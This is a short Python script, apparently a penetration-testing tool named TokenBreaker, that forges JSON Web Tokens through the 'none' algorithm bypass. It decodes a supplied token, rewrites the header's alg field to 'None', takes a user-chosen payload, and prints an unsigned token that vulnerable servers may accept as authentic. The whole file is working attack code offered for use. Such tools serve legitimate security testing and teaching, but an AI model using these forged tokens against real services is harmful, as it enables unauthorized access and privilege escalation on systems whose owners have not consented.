#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function

import argparse
import base64
import re
from sys import exit

def info(txt): return '[\033[1m\033[36m*\033[0m] \033[34m'+str(txt)+'\033[0m'
def bad(txt): return '[\033[1m\033[31m-\033[0m] \033[31m'+str(txt)+'\033[0m'
def warning(txt): return'[\033[1m\033[33m!\033[0m] \033[33m'+str(txt)+'\033[0m'
def good(txt): return '[\033[1m\033[32m+\033[0m] \033[32m'+str(txt)+'\033[0m'
def cool_input(text):
    try:
        _input = raw_input('[\033[1m\033[35m<\033[0m] \033[35m{}:\033[0m \033[3m'.format(text))
        print('\033[0m', end='')
        return _input
    except KeyboardInterrupt:
        print('\b\b  \033[0m')
        print(bad('Exitting via Keyboard Interruption.'))
        exit(0)
    except EOFError:
        print('\033[0m')
        print(bad('Terminating!'))
        exit(0)

def banner():
    logo = '\033[1m ________         _  __\n/_  __/ /  ___   / |/ /__  ___  ___\n / / / _ \\/ -_) /    / _ \\/ _ \\/ -_)\n/_/ /_//_/\\__/ /_/|_/\\___/_//_/\\__/\n\033[0m'
    print(logo)

def verify_Padding(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += b'='* (4 - missing_padding)
    return data

def processTheNoneToken(token):
    header=base64.b64decode(verify_Padding(token.split('.')[0]))
    payload=base64.b64decode(verify_Padding(token.split('.')[1]))
    print(info("Decoded Header value: {}".format(header)))
    print(info("Decoded Payload value: {}".format(payload)))
    header=re.sub('"alg":".{5}"','"alg":"None"',header)
    print(info("New header value with none algorithm: {}".format(header)))

    modify_response = cool_input("Modify Header? [y/N]")
    if modify_response.lower() == 'y':
        header = cool_input("Enter your header with 'alg' field set to 'None'")
        print(info("Header set to: " + header))
    payload = cool_input("Enter your payload")
    base64header = base64.b64encode(header).rstrip('=')
    base64payload = base64.b64encode(payload).rstrip('=')
    finaljwt = base64header + '.' + base64payload + "."
    print(good("Successfully encoded Token: {}".format(finaljwt)))

def main():
    parser = argparse.ArgumentParser(description='TokenBreaker: 1.TheNoneAlgorithm',
            epilog='Example Usage: \npython TheNone.py -t [JWTtoken]\n')
    requiredparser=parser.add_argument_group('required arguments')
    requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
    args = parser.parse_args()
    banner()
    processTheNoneToken(args.token)

if __name__=='__main__':
    main()
